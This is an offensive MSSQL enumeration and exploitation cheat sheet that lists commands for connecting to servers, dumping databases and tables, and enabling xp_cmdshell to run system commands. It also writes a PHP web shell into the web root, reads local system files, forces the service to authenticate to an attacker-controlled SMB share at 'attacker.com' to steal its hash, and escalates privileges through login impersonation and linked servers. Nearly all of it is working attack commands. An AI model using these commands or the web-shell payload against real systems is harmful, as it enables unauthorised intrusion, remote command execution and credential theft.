# MSSQL Enumeration Cheatsheet

Enumerating MSSQL services (ports 1433, 2433).

## 1. Connect to MSSQL (sqlcmd)
Connect to an MSSQL server from Windows.
```bash
sqlcmd -S target.com -U user -P 'password' -y 30 -Y 30
```
- `-S`: Target server.
- `-U user`: Username.
- `-P 'password'`: Password.
- `-y 30 -Y 30`: Adjusts output width.

## 2. Connect to MSSQL from Linux (sqsh)
Connect to MSSQL from Linux.
```bash
sqsh -S target.com -U user -P 'password' -h
```
- `-S`: Target server.
- `-U user`: Username.
- `-P 'password'`: Password.
- `-h`: Disables headers for cleaner output.

## 3. Connect to MSSQL with Windows Auth (sqsh)
Connect to MSSQL using Windows Authentication.
```bash
sqsh -S target.com -U .\\user -P 'password' -h
```
- `-U .\\user`: Username with local host prefix for Windows Auth.

## 4. Connect to MSSQL (mssqlclient.py)
Connect to MSSQL using Impacket's mssqlclient.py.
```bash
mssqlclient.py -p 1433 user@target.com
```
- `-p 1433`: Specify port.
- `user@target.com`: Username and target server.

## 5. Show MSSQL Databases
List all available databases in MSSQL.
```sql
SELECT name FROM master.dbo.sysdatabases
GO
```

## 6. Select MSSQL Database
Switch to a specific database in MSSQL.
```sql
USE dbname
GO
```

## 7. Show MSSQL Tables
List tables in the selected database in MSSQL.
```sql
SELECT table_name FROM dbname.INFORMATION_SCHEMA.TABLES
GO
```

## 8. Select MSSQL Table Data
Retrieve all entries from a table in MSSQL.
```sql
SELECT * FROM users
GO
```

## 9. Enable xp_cmdshell in MSSQL
Enable command execution in MSSQL (requires admin privileges).
```sql
EXECUTE sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO
EXECUTE sp_configure 'xp_cmdshell', 1
GO
RECONFIGURE
GO
```

## 10. Execute System Command in MSSQL
Run a system command via MSSQL (if xp_cmdshell enabled).
```sql
xp_cmdshell 'whoami'
GO
```

## 11. Enable Ole Automation Procedures in MSSQL
Enable file writing capabilities in MSSQL (requires admin privileges).
```sql
sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO
sp_configure 'Ole Automation Procedures', 1
GO
RECONFIGURE
GO
```

## 12. Create a File in MSSQL
Write a file (e.g., webshell) using MSSQL (if Ole Automation enabled).
```sql
DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', NULL, '<?php echo shell_exec($_GET["c"]);?>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
GO
```

## 13. Read Local Files in MSSQL
Read local files in MSSQL (requires read access).
```sql
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
GO
```

## 14. Steal MSSQL Service Hash (xp_dirtree)
Force MSSQL to authenticate to a fake SMB share.
```sql
EXEC master..xp_dirtree '\\attacker.com\share\'
GO
```

## 15. Steal MSSQL Service Hash (xp_subdirs)
Force MSSQL to authenticate to a fake SMB share.
```sql
EXEC master..xp_subdirs '\\attacker.com\share\'
GO
```

## 16. Identify Users to Impersonate in MSSQL
List users that can be impersonated in MSSQL.
```sql
SELECT DISTINCT b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
GO
```

## 17. Check Current User and Role in MSSQL
Verify current user and sysadmin role status in MSSQL.
```sql
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO
```

## 18. Impersonate a User in MSSQL
Impersonate a user and check privileges in MSSQL.
```sql
EXECUTE AS LOGIN = 'username'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO
```

## 19. Revert Impersonation in MSSQL
Revert to the original user in MSSQL.
```sql
REVERT
GO
```

## 20. Identify Linked Servers in MSSQL
List linked servers in MSSQL.
```sql
SELECT srvname, isremote FROM sysservers
GO
```

## 21. Query Linked Server in MSSQL
Check user and privileges on a linked server.
```sql
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [linkedserver.com]
GO
```